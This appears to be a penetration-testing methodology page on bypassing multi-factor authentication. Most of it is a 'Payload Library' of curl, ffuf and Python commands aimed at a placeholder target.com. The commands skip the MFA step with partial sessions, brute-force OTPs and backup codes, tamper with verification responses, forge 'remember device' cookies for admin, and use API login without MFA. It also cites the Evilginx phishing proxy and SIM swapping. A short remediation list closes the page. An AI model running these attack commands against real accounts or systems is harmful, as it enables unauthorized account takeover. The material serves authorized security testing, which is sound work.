---
title: "MFA Bypass Techniques"
date: 2026-02-24
draft: false
---

# MFA Bypass Techniques

> **Severity**: Critical | **CWE**: CWE-304, CWE-287
> **OWASP**: A07:2021 – Identification and Authentication Failures

---

## What Is MFA Bypass?

Multi-Factor Authentication requires something you know + something you have/are. Bypasses exploit: logic flaws in implementation (skipping the MFA step), OTP brute force, session state manipulation, SS7/SIM attacks, phishing-in-real-time, and backup code abuse.

---

## Discovery Checklist

- [ ] Map the full auth flow: login → MFA challenge → success
- [ ] Test skipping the MFA step entirely (direct navigate to post-auth page)
- [ ] Test replaying the login-only session token before MFA completion
- [ ] Test OTP brute force — is there a rate limit per account?
- [ ] Test OTP reuse — can same OTP be used twice?
- [ ] Test OTP validity window — accepts OTPs from past/future periods?
- [ ] Test backup codes — length, entropy, reuse policy
- [ ] Test "remember this device" bypass — forged cookie value
- [ ] Test MFA skip via OAuth SSO (if SSO login doesn't require MFA)
- [ ] Test API endpoint directly vs web UI (API may skip MFA)
- [ ] Test race condition on OTP validation
- [ ] Test response manipulation — change `mfa_required: true` to `false`

---

## Payload Library

### Attack 1 — Step Skip / Flow Bypass

```bash
# Login with valid credentials → MFA challenge shown
# Instead of entering OTP, navigate directly to authenticated endpoint:

# Step 1: POST /login → response: {"status": "mfa_required", "session": "PARTIAL_SESSION"}
# Step 2: Instead of GET /mfa-verify, try:
curl -s https://target.com/dashboard \
  -b "session=PARTIAL_SESSION"

# Or: after /login, check if full session cookie is already set:
# If Set-Cookie: auth_session=... is in /login response → already authenticated?
curl -s -c cookies.txt -X POST https://target.com/login \
  -d "username=victim&password=password"
cat cookies.txt
# Use the session cookie directly:
curl -s https://target.com/account/profile -b "auth_session=VALUE"

# Test skipping via direct URL:
# /mfa-challenge?redirect=/admin → skip to /admin
curl -s "https://target.com/mfa-challenge?redirect=/admin" \
  -b "partial_session=VALUE"
```

### Attack 2 — OTP Brute Force

```python
# TOTP is 6 digits = 1,000,000 combinations
# But window is usually 30s → only 3 valid codes at a time
# Rate limiting is the critical defense

# Burp Intruder payload: 000000 to 999999
# Or generate wordlist:
python3 -c "
for i in range(1000000):
    print(f'{i:06d}')
" > otp_wordlist.txt

# ffuf:
ffuf -u https://target.com/verify-otp -X POST \
  -d "otp=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "session=PARTIAL_SESSION" \
  -w otp_wordlist.txt \
  -mc 302,200 -fr "Invalid OTP"

# Race condition burst (all within 30s window):
import threading, requests
def try_otp(code):
    r = requests.post("https://target.com/verify-otp",
        data={"otp": str(code).zfill(6)},
        cookies={"session": "PARTIAL_SESSION"},
        allow_redirects=False)
    if r.status_code != 200 or "Invalid" not in r.text:
        print(f"[HIT] {code}: {r.status_code}")

threads = [threading.Thread(target=try_otp, args=(i,)) for i in range(1000000)]
# Not practical, but for short-range: narrow window with timing
```

### Attack 3 — Response Manipulation

```bash
# Intercept MFA verification response:
# Original failure response:
{"success": false, "mfa_verified": false, "message": "Invalid OTP"}
# Modified:
{"success": true, "mfa_verified": true, "message": "OTP verified"}

# Redirect-based bypass:
# Original: 302 to /mfa-challenge (OTP failed)
# Change to: 302 to /dashboard

# Boolean field manipulation:
# If response contains: {"require_mfa": true}
# Intercept and change: {"require_mfa": false}
# Then resend — if client-side logic processes this value

# Status code manipulation:
# 401 Unauthorized → 200 OK (some client-side apps trust status code)
# Change HTTP/1.1 401 to HTTP/1.1 200
```

### Attack 4 — OTP Reuse and Extended Window

```bash
# Test OTP reuse:
# 1. Get valid OTP from authenticator app
# 2. Use it once (success)
# 3. Immediately try to use same OTP again
# → Should fail; if it succeeds → OTP not invalidated after use

# Test extended time window:
# Standard TOTP window: ±1 period (90s total)
# Test with: current OTP from 10 minutes ago
# → If app accepts → overly large window

# Test OTP from previous session:
# User A gets OTP, doesn't use it
# User B's account gets OTP submitted with User A's (stolen) OTP
# (Bypasses if OTPs aren't account-bound)
```

### Attack 5 — Backup Code Enumeration

```bash
# Backup codes are typically 8-10 numeric digits
# Test brute force if no rate limit:
ffuf -u https://target.com/backup-code-verify -X POST \
  -d "code=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "session=PARTIAL_SESSION" \
  -w <(python3 -c "
for i in range(100000000):
    print(f'{i:08d}')
  ") -mc 302,200 -fr "Invalid"

# Backup code format patterns:
# XXXX-XXXX (8 hex groups)
# 123456789 (9 digits)
# abc12def (alphanumeric 8 chars)

# Test: if backup code only validated on front-end (JavaScript):
# Disable JS, submit any code → does server still validate?
```

### Attack 6 — "Remember Device" Bypass

```bash
# If "remember this device for 30 days" stores a cookie:
# Test: forge a plausible "remember_device" token

# Common formats:
# base64(user_id + "|" + device_id)
# HMAC-SHA256 signed token (check for weak secret)
# Simple UUID or random string

# Extract legitimate "remember" cookie:
# Set-Cookie: remembered_device=BASE64_VALUE
echo "BASE64_VALUE" | base64 -d
# → user_id:12345:device:abc123:exp:1735000000

# Forge for admin:
echo -n "user_id:1:device:abc123:exp:9999999999" | base64
# Set cookie with forged value:
curl -s https://target.com/login \
  -d "username=admin&password=KNOWN" \
  -b "remembered_device=FORGED_VALUE"
```

### Attack 7 — SIM Swap / SS7 (SMS-based OTP)

```bash
# Conceptual — not a web test, but relevant context:
# SMS OTP attacks:
# 1. SIM swap: social engineer carrier → receive victim's SMS
# 2. SS7 attack: intercept SMS at telecom level
# 3. SIM clone (physical access)
# 4. OTP phishing: real-time AITM proxy (Evilginx, Modlishka)

# Real-time phishing proxy (Evilginx):
# Sets up a reverse proxy that sits between victim and target
# Victim authenticates (including MFA) → proxy captures session cookie
# No need to bypass MFA technically — proxy passes it through and steals the session

# Test: is SMS OTP the only MFA option? Can attacker downgrade to SMS from TOTP?
# Try: change MFA method from TOTP to SMS in account settings
```

### Attack 8 — API MFA Bypass

```bash
# Web UI enforces MFA but API endpoints may not:
# Test direct API access after password-only auth:

# Web login: POST /login → redirects to /mfa-verify
# API login: POST /api/v1/auth/login → returns token directly?

curl -s -X POST https://target.com/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "password"}'
# → If returns {"token": "..."} without MFA → API bypass

# Mobile API may have separate endpoint:
POST /mobile/v2/auth/login    # different than web
POST /app/login               # mobile-specific
```

---

## Tools

```bash
# Burp Suite:
# - Proxy: intercept MFA response → Repeater for manipulation
# - Intruder: OTP brute force with 000000-999999 payload
# - Turbo Intruder: race condition on OTP validation

# pyotp — generate valid TOTP codes (if secret is known/leaked):
pip3 install pyotp
python3 -c "import pyotp; print(pyotp.TOTP('SECRET_BASE32').now())"

# Test rate limiting — expect lockout after N attempts:
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/verify-otp \
    -d "otp=$(printf '%06d' $i)" \
    -b "session=PARTIAL_SESSION" | head -1
done

# Evilginx (adversary-in-the-middle phishing framework):
# github.com/kgretzky/evilginx2
# For authorized phishing simulations only

# Monitor MFA response timing:
# Time-based oracle: correct OTP may take longer (DB lookup) vs wrong OTP
for otp in 000000 000001 123456; do
  time curl -s -X POST https://target.com/verify-otp \
    -d "otp=$otp" -b "session=VAL" > /dev/null
done
```

---

## Remediation Reference

- **Enforce MFA check server-side on every protected endpoint** — not just at the MFA step
- **Invalidate partial-auth session tokens** if MFA not completed within time limit
- **Rate-limit OTP attempts**: max 5–10 per 15 minutes, account lockout after threshold
- **Single-use OTPs**: immediately invalidate after first successful use
- **Narrow TOTP window**: ±1 period (30s drift) is sufficient; never more than ±2
- **Account-bind OTPs**: TOTP codes must be verified against the specific user's secret
- **Phishing-resistant MFA**: prefer hardware keys (WebAuthn/FIDO2) over TOTP or SMS
- **Remove SMS as fallback** if TOTP/WebAuthn is available — SMS is the weakest link

*Part of the Web Application Penetration Testing Methodology series.*
